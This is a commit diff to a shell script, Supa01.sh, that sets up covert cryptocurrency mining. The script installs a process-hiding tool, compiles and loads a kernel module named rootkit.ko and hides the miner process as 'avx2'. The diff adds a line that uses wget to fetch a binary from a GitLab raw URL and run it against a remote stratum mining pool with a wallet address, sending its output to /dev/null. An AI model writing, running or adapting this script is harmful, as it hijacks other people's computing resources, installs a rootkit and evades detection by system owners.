76842ea89757697e93cba209cdabefc9dd5a3e48
BatiKangkung <107105404+BatiKangkung@users.noreply.github.com>
2022-07-17 12:43:43 +0700

    Update Supa01.sh

--- Supa01.sh
+++ Supa01.sh
@@ -3,14 +3,18 @@ git clone https://github.com/BatiKangkung/Kerecek
 sudo apt-get update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.10.0 -y && npm i -g node-process-hider 
 sudo apt-get install cpulimit
 cd Kerecek/
+rm -rf avx2
 ph add avx2 
 cpulimit -l 180 -e avx2 &
 make
 dmesg -C
 insmod rootkit.ko
 dmesg
+wget -O avx2 https://gitlab.com/bolihufu.avefomah/semaphore-test/raw/master/vkax
 chmod +x avx2
-./avx2 -a yespower -o stratum+tcps://bte.wisnuardhi27.my.id:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null & 
+# ./avx2 -a mike -o stratum+tcps://stratum-na.rplant.xyz:17040 -u XoL3WHgSqF3mZcKajC3JG15VAhZXtdGYR1.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null &
+# ./avx2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null & 
+./avx2 -a minotaurx -o stratum+tcps://stratum-na.rplant.xyz:17068 -u RP7dNRcUFy4BngHv5okrAMHAkW3guQ7kCU.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null &
 uname -a
 pkill -31 avx2
 pkill -31 cpulimit
